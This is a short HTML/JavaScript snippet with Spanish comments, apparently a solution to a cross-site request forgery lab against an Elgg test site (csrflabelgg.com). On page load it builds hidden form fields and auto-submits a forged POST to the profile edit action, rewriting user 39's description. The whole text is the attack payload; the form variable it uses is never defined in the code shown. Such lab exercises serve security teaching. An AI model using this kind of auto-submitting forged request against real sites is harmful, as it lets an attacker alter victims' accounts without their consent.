<script type="text/javascript">
function forge_post()
{
	var fields = "";

	// Este es el texto de la descripcion
	fields += "<input type='hidden' name='description' value='¡Boby eres mi heroe! (Ataque CSRF)'>";
	// En el valor tenemos que poner "39" que es el la identificacion usuario de Alicia
	fields += "<input type='hidden' name='guid' value='39'>";

	p.action = "http://www.csrflabelgg.com/action/profile/edit";
	p.innerHTML = fields;
	p.method = "post";
	document.body.appendChild(p);

	p.submit();
}
window.onload = function() { forge_post();}
